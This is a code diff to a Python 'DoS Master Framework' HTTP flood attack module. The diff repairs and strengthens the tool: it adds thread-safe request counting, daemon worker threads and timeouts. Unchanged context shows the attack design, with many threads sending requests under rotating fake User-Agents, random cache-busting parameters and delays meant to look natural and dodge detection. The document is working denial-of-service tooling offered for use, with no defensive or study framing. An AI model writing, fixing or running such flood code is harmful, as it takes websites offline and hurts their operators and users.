@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-DoS Master Framework - HTTP Flood Attack Module
-Professional HTTP flood implementation
+DoS Master Framework - HTTP Flood Attack Module - FIXED VERSION
+Professional HTTP flood implementation with thread-safe counting
 """
 
 import threading
@@ -9,6 +9,7 @@ import time
 import requests
 import random
 import urllib3
+import string
 from typing import Dict, Any, List
 from datetime import datetime
 
@@ -35,6 +36,7 @@ class HTTPFlood:
         self.attack_active = False
         self.start_time = None
         self.worker_threads = []
+        self.request_lock = threading.Lock()  # Thread-safe counter
         
         # Realistic User-Agent strings
         self.user_agents = [
@@ -84,6 +86,7 @@ class HTTPFlood:
             # Start worker threads
             for i in range(self.threads):
                 thread = threading.Thread(target=self._http_worker, args=(i,))
+                thread.daemon = True
                 thread.start()
                 self.worker_threads.append(thread)
                 time.sleep(0.1)
@@ -93,7 +96,7 @@ class HTTPFlood:
             
             # Wait for all threads to complete
             for thread in self.worker_threads:
-                thread.join()
+                thread.join(timeout=2)
             
             # Calculate results
             end_time = time.time()
@@ -145,7 +148,7 @@ class HTTPFlood:
                     # Add random parameters
                     params = {'_': int(time.time() * 1000)}
                     if random.random() > 0.5:
-                        params['q'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
+                        params['q'] = ''.join(random.choices(string.ascii_lowercase, k=10))
                     
                     # Make request
                     response = session.get(url, params=params, 
@@ -166,6 +169,16 @@ class HTTPFlood:
                     else:
                         # Random delay to appear more natural
                         time.sleep(random.uniform(0.1, 0.5))
+                    
+                    # Update global counters every 10 requests
+                    if local_requests_sent % 10 == 0:
+                        with self.request_lock:
+                            self.requests_sent += 10
+                            self.requests_successful += local_requests_successful
+                            self.requests_failed += local_requests_failed
+                        local_requests_sent = 0
+                        local_requests_successful = 0
+                        local_requests_failed = 0
                         
                 except requests.RequestException as e:
                     local_requests_sent += 1
@@ -177,17 +190,20 @@ class HTTPFlood:
                     self.logger.debug(f"Worker {worker_id} unexpected error: {e}")
                     break
             
-            # Update global counters
-            self.requests_sent += local_requests_sent
-            self.requests_successful += local_requests_successful
-            self.requests_failed += local_requests_failed
+            # Final update for remaining requests
+            with self.request_lock:
+                self.requests_sent += local_requests_sent
+                self.requests_successful += local_requests_successful
+                self.requests_failed += local_requests_failed
             
             session.close()
             
         except Exception as e:
             self.logger.error(f"HTTP worker {worker_id} failed: {e}")
+            with self.request_lock:
+                self.requests_failed += 1
             
-        self.logger.debug(f"HTTP worker {worker_id} completed: {local_requests_sent} requests sent")
+        self.logger.debug(f"HTTP worker {worker_id} completed")
     
     def _generate_headers(self) -> Dict[str, str]:
         """Generate realistic HTTP headers"""
